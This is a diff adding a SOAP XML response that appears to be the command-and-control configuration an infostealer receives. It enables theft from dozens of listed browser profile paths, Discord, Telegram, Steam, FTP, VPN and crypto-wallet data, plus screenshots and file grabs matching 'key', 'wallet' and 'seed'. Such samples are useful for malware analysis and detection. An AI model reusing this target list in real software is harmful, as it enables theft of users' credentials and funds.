@@ -1,0 +1,86 @@
+<s:Envelope
+	xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
+	<s:Body>
+		<EnvironmentSettingsResponse
+			xmlns="http://tempuri.org/">
+			<EnvironmentSettingsResult
+				xmlns:a="BrowserExtension"
+				xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
+				<a:BlockedCountry
+					xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays"/>
+					<a:BlockedIP
+						xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays"/>
+						<a:Object4>true</a:Object4>
+						<a:Object6>false</a:Object6>
+						<a:ScanBrowsers>true</a:ScanBrowsers>
+						<a:ScanChromeBrowsersPaths
+							xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
+							<b:string>%USERPROFILE%\AppData\Local\Battle.net</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Chromium\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Google\Chrome\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Google(x86)\Chrome\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Roaming\Opera Software\</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\MapleStudio\ChromePlus\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Iridium\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\7Star\7Star\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\CentBrowser\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Chedot\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Vivaldi\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Kometa\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Elements Browser\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Epic Privacy Browser\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\uCozMedia\Uran\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\CatalinaGroup\Citrio\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Coowon\Coowon\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\liebao\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\QIP Surf\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Orbitum\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Comodo\Dragon\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Amigo\User\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Torch\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Yandex\YandexBrowser\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Comodo\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\360Browser\Browser\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Maxthon3\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\K-Melon\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Sputnik\Sputnik\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Nichrome\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\CocCoc\Browser\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Uran\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Chromodo\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Mail.Ru\Atom\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\BraveSoftware\Brave-Browser\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\NVIDIA Corporation\NVIDIA GeForce Experience</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\Steam</b:string>
+							<b:string>%USERPROFILE%\AppData\Local\CryptoTab Browser\User Data</b:string>
+						</a:ScanChromeBrowsersPaths>
+						<a:ScanDiscord>true</a:ScanDiscord>
+						<a:ScanFTP>true</a:ScanFTP>
+						<a:ScanFiles>true</a:ScanFiles>
+						<a:ScanFilesPaths
+							xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
+							<b:string>%userprofile%\Desktop|*.txt,*.doc*,*key*,*wallet*,*seed*|0</b:string>
+							<b:string>%userprofile%\Documents|*.txt,*.doc*,*key*,*wallet*,*seed*|0</b:string>
+						</a:ScanFilesPaths>
+						<a:ScanGeckoBrowsersPaths
+							xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
+							<b:string>%USERPROFILE%\AppData\Roaming\Mozilla\Firefox</b:string>
+							<b:string>%USERPROFILE%\AppData\Roaming\Waterfox</b:string>
+							<b:string>%USERPROFILE%\AppData\Roaming\K-Meleon</b:string>
+							<b:string>%USERPROFILE%\AppData\Roaming\Thunderbird</b:string>
+							<b:string>%USERPROFILE%\AppData\Roaming\Comodo\IceDragon</b:string>
+							<b:string>%USERPROFILE%\AppData\Roaming\8pecxstudios\Cyberfox</b:string>
+							<b:string>%USERPROFILE%\AppData\Roaming\NETGATE Technologies\BlackHaw</b:string>
+							<b:string>%USERPROFILE%\AppData\Roaming\Moonchild Productions\Pale Moon</b:string>
+						</a:ScanGeckoBrowsersPaths>
+						<a:ScanScreen>true</a:ScanScreen>
+						<a:ScanSteam>true</a:ScanSteam>
+						<a:ScanTelegram>true</a:ScanTelegram>
+						<a:ScanVPN>true</a:ScanVPN>
+						<a:ScanWallets>true</a:ScanWallets>
+					</EnvironmentSettingsResult>
+				</EnvironmentSettingsResponse>
+			</s:Body>
+		</s:Envelope>
